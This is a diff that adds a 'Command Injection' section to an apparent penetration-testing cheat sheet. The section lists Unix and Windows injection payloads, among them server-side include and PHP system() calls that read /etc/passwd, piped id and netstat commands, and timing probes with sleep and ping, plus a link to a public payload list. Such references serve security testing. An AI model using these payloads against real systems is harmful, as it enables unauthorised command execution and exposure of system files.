@@ -60,6 +60,44 @@ Jinja2
 
 - LIKE: `%`, `*`
 
+## Command Injection
+
+**Unix Payloads**
+
+```
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+;netstat -a;
+;system('cat%20/etc/passwd')
+|id
+\n/bin/ls -al\n
+a);id
+%0Acat%20/etc/passwd
+& ping -i 30 127.0.0.1 &
+<?php system("cat /etc/passwd");?>
+```
+
+**Windows Payloads**
+
+```
+'
+'"
+"
+"'
+%0a
+%0a%0d
+eval('ls')
+exec('ls')
+system('ls')
+| sleep 1
+; sleep 1
+& sleep 1
+&& sleep 1`
+```
+
+**Links**
+
+- https://github.com/payloadbox/command-injection-payload-list
+
 ## Databases
 
 - Default Passwords: https://cirt.net/passwords
